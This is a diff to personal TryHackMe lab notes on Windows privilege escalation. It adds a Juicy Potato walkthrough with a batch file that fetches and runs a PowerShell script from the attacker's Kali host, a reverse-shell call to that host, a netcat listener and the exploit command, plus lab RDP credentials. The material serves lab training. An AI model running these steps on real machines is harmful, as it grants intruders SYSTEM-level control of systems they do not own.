@@ -1,6 +1,6 @@
 # 6 - Windows Priv Esc
 
-Room Link --> [https://tryhackme.com/room/windows10privesc](https://tryhackme.com/room/windows10privesc)
+oom Link --> [https://tryhackme.com/room/windows10privesc](https://tryhackme.com/room/windows10privesc)
 
 Vpn connect -->  `xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.16.33`
 
@@ -358,7 +358,9 @@ Start a listener on Kali, and then simulate an admin logon using RDP and the cre
 
 A shell running as admin should connect back to your listener.
 
-### 14 - Token Impersonation - Rogue Potato
+### 14 - Token Impersonation
+
+### 14a - Rogue Potato
 
 > There are a lot of different potatoes used to escalate privileges from Windows Service Accounts to NT AUTHORITY/SYSTEM.
 >
@@ -399,6 +401,71 @@ Finally..
 <figure><img src=".gitbook/assets/image (46).png" alt=""><figcaption><p>3</p></figcaption></figure>
 
 And We get "NT Authority"
+
+### 14b - Juicy Potato
+
+{% hint style="warning" %}
+If the machine is < Windows 10 1809 < Windows Server 2019 — Try Juicy Potato
+
+I did this attack on Windows Server 2016.
+{% endhint %}
+
+So we already have initial access to some low level/privileged service account that has "SeImpersonatePrivilege" access.
+
+Lets do the Juicy Potato attack --> [https://github.com/ohpe/juicy-potato/releases/tag/v0.1](https://github.com/ohpe/juicy-potato/releases/tag/v0.1)
+
+Nishang Powershell reverse shell --> [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)
+
+Download the ".exe" file and transfer to the victim C:\temp dir.
+
+This will allow us to run executables as a SYSTEM level process. The main idea here is that:
+
+* The JuicyPotato exploit runs a ".bat" file we will create as SYSTEM.
+* The .bat file with SYSTEM privileges downloads our Nishang reverse shell hosted on our kali and executes it.
+* We get a SYSTEM shell on our side by using a netcat listener.
+
+#### Attack:
+
+1. Create a "inv.bat" file with content:&#x20;
+
+{% code title="inv.bat" overflow="wrap" lineNumbers="true" %}
+```powershell
+# it contains link to our local python http server on kali.
+PowerShell IEX (New-Object Net.WebClient).downloadString('http://<kaliIP>:8000/Invoke-PowerShellTcp.ps1')
+# so basically, running this .bat file should download the "Invoke-PowerShellTcp.ps1" file from the server.
+```
+{% endcode %}
+
+2. Add this to at the end of the "Invoke-PowerShellTcp.ps1" script before hosting it.
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+# we are calling the "Invoke-PowerShellTcp" function from the file directly.
+# port 9002 is the port we are going to listen on to catch the new shell.
+Invoke-PowerShellTcp -Reverse -IPAddress <kaliIP> -Port 9002
+```
+{% endcode %}
+
+or you can use this one instead.
+
+{% file src=".gitbook/assets/Invoke-PowerShellTcp.ps1" %}
+or use this one instead.
+{% endfile %}
+
+2. Host the file: `python3 http.server` .
+3. Setup listener, `nc -nvlp 9002` .
+4. On the victim, run the cmd.
+
+{% code overflow="wrap" lineNumbers="true" %}
+```powershell
+# Note: the -l can be any random port of your choice.
+.\JuicyPotato.exe -t * -p inv.bat -l 8090
+
+# this should execute the "inv.bat" script, which inturns download "Invoke-PowerShellTcp.ps1" from our server, which automatically calls the "Invoke-PowerShellTcp" function, which gives us a shell as "NT Authority"
+```
+{% endcode %}
+
+<figure><img src=".gitbook/assets/image (72).png" alt=""><figcaption><p>full attack</p></figcaption></figure>
 
 ### 15 - **Token Impersonation — PrintSpoofer**
 
